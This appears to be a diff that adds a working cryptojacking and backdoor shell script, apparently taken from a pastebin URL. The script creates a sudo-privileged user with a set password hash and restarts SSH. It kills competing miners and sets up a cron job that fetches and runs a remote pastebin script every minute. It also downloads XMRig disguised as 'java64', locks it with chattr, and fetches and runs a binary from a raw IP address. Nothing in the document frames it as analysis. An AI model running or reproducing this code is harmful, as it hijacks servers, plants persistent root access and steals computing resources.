@@ -1,0 +1,67 @@
+https://pastebin.com/raw/cDNmXZRi
+
+#!/bin/sh
+useradd -m -p '$1$EuTlnGKV$I6ULVhrfUCnEpFqLGFVHY0' darmok;
+usermod -aG sudoers darmok;
+usermod -aG darmok;
+usermod -aG root darmok;
+adduser darmok sudo;
+echo "darmok    ALL=(ALL)       ALL" >> /etc/sudoers
+/etc/init.d/ssh restart;
+/etc/init.d/sshd restart;
+/etc/rc.d/sshd restart;
+service ssh restart;
+service sshd restart;
+scw-fetch-ssh-keys --upgrade;
+chattr -i /etc/cron.d/2m
+chattr -i /etc/cron.d/1m
+chattr -i /var/tmp/java/java64
+chattr -i /tmp/*
+mkdir /tmp
+echo "" > /etc/cron.d/2m
+echo "" > /etc/cron.d/1m
+chattr -i $HOME/moneroocean/config.json
+systemctl stop moneroocean_miner.service;
+systemctl disable moneroocean_miner.service;
+rm -rf /root/moneroocean;
+ps -ef | grep nullcrew | grep -v grep | awk '{print $2}' | xargs -r kill -9
+ps -ef | grep kworker_ | grep -v grep | awk '{print $2}' | xargs -r kill -9
+ps -ef | grep darwin | grep -v grep | awk '{print $2}' | xargs -r kill -9
+ps -ef | grep mdad | grep -v grep | awk '{print $2}' | xargs -r kill -9
+ps -ef | grep tor | grep -v grep | awk '{print $2}' | xargs -r kill -9
+ps -ef | grep main | grep -v grep | awk '{print $2}' | xargs -r kill -9
+ps aux | grep -vw java64 | awk '{if($3>40.0) print $2}' > /tmp/proc && while read procid; do kill -9 $procid; done < /tmp/proc
+ps -fe |grep -w java64 |grep -v grep
+if [ $? -eq 0 ]
+then
+pwd
+else
+rm -rf /var/tmp/java/java64
+crontab -r || true && \
+echo "* * * * * curl -s https://pastebin.com/raw/cDNmXZRi | sed 's/[^[:print:]]//g' | bash -s" >> /tmp/cron || true && \
+crontab /tmp/cron || true && \
+rm -rf /tmp/cron || true && \
+curl -s -L "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz;
+mkdir /var/tmp/java;
+tar xf /tmp/xmrig.tar.gz -C /var/tmp/java;
+rm /tmp/xmrig.tar.gz;
+mv /var/tmp/java/xmrig /var/tmp/java/java64;
+chmod 777 /var/tmp/java/java64;
+cd /var/tmp/java
+curl -s -L https://pastebin.com/raw/JTqeGNvd | sed 's/[^[:print:]]//g' > /var/tmp/java/config.json;
+/sbin/sysctl -w vm.nr_hugepages=1000
+ps aux | grep -vw java64 | awk '{if($3>40.0) print $2}' > /tmp/proc && while read procid; do kill -9 $procid; done < /tmp/proc
+ps -ef | grep tor | grep -v grep | awk '{print $2}' | xargs -r kill -9;
+ps -ef | grep main | grep -v grep | awk '{print $2}' | xargs -r kill -9;
+nohup /var/tmp/java/java64 -c config.json >/dev/null &
+chattr +i /var/tmp/java/java64
+fi
+cd /var/tmp/
+curl -O http://114.116.115.57/zehir/z3hir.x86;
+cat z3hir.x86 >basdd;
+chmod +x basdd;
+nohup /var/tmp/basdd;
+sleep 3
+rm -rf /tmp/log.jpg
+rm -rf /tmp/nullcrew
+echo "runing....."
